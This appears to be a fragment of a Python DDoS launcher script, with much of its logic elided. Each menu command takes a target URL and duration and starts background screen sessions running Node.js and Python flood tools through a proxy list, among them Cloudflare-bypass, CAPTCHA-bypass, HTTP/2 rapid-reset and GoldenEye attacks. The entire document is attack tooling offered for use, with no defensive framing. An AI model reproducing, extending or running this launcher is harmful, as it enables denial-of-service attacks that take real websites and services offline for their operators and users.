...
""")
            ...
            try:
                ...
                if ip:
                    ...
                    os.system('clear')
                    os.system(f'screen -dm node cf-bs.js {url} {duration} 100 10 proxy.txt')
                    os.system(f'screen -dm node ACK.js {url} {duration} 32 10 proxy.txt')
                    os.system(f'screen -dm node BYPASS.js {url} {duration} 100 10 proxy.txt')
...
""")
            ...
            try:
                ...
                if ip:
                    ...
                    os.system('clear')
                    os.system(f'screen -dm node chaptcha.js {url} {duration} 100 10 proxy.txt')
                    os.system(f'screen -dm node uam.js {url} {duration} 32 10 proxy.txt')
                    os.system(f'screen -dm node Cat.js {url} {duration} 10 32 proxy.txt')
...
""")
            ...
            try:
                ...
                if ip:
                    ...
                    os.system('clear')
                    os.system(f'screen -dm node flood.js {url} {duration} 10 proxy.txt 100')
                    os.system(f'screen -dm node livex.js {url} {duration} 10 32 proxy.txt --debug=true --ua=all --querystring=true')
                    ...
                    os.system(f'screen -dm node FLOOD2.js {url} {duration} 10 proxy.txt 100 3')
...
""")
            ...
            try:
                ...
                if ip:
                    ...
                    os.system('clear')
                    os.system(f'screen -dm node H2-Rapid-Reset.js GET {duration} 10 proxy.txt 32 {url}')
                    os.system(f'screen -dm node H2-Rapid-Reset.js POST {duration} 10 proxy.txt 32 {url}')
...
""")
            ...
            try:
                ...
                if ip:
                    ...
                    os.system('clear')
                    os.system(f'screen -dm node hold.js {url} {duration} 32 10 proxy.txt')
                    os.system(f'screen -dm node PRIV-CIKO.js {url} {duration} 32 10 proxy.txt')
                    os.system(f'screen -dm node RAPID.js {url} {duration} 32 10 proxy.txt')
...
""")
            ...
            try:
                ...
                if ip:
                    ...
                    os.system('clear')
                    os.system(f'screen -dm node HTTPS.js GET {url} {duration} 10 32 proxy.txt')
                    os.system(f'screen -dm node HTTPS.js POST {url} {duration} 10 32 proxy.txt')
                    os.system(f'screen -dm node HTTPS2.js {url} {duration} 100 10 proxy.txt')
...
""")
            ...
            try:
                ...
                if ip:
                    ...
                    os.system('clear')
                    os.system(f'screen -dm node kill.js {url} {duration} 10')
                    os.system(f'screen -dm node painzy.js {url} {duration}')
                    os.system(f'screen -dm node fatzx.js {url} {duration} 10')
...
""")
            ...
            try:
                ...
                if ip:
                    ...
                    os.system('clear')
                    os.system(f'screen -dm node MIX.js {url} {duration} 100 10')
                    os.system(f'screen -dm node MIXSYN.js {url} 10 {duration}')
                    os.system(f'screen -dm node MIXRAW.js {url} 10 {duration}')
...
""")
        ...
        elif sinput == "nuclir" or sinput == "NUCLIR":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])
                ...
                if ip:
                    ...
                    os.system('clear')
                    os.system(f'screen -dm python3 goldeneye.py {url} -w 10 -s 500 -m random -d True')
                    os.system(f'screen -dm node barave.js {url} {duration} 32 10 proxy.txt')
...
""")
            ...
            try:
                ...
                if ip:
                    ...
                    os.system('clear')
                    os.system(f'screen -dm node Storm.js {url} {duration} 100 10 proxy.txt')
                    os.system(f'screen -dm node HTTP-X.js {url} {duration} 32 10 proxy.txt')
...
""")
            ...
            try:
                ...
                if ip:
                    ...
                    os.system('clear')
                    os.system(f'screen -dm node strike.js GET {url} {duration} 10 32 proxy.txt')
                    os.system(f'screen -dm node strike.js POST {url} {duration} 10 32 proxy.txt')
...
""")
            ...
            try:
                ...
                if ip:
                    ...
                    os.system('clear')
                    os.system(f'screen -dm node h2.js GET {url} proxy.txt {duration} 100 10')
                    os.system(f'screen -dm node h2.js POST {url} proxy.txt {duration} 100 10')
                    os.system(f'screen -dm node hyper.js {url} {duration}')
...
""")
        ...
        elif sinput == "medusa" or sinput == "MEDUSA":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])
                ...
                if ip:
                    ...
                    os.system('clear')
                    os.system(f'screen -dm node Medusa.js {url} {duration} 32 10 proxy.txt')
                    os.system(f'screen -dm node MegaMedusa.js {url} {duration} 32 10 proxy.txt')
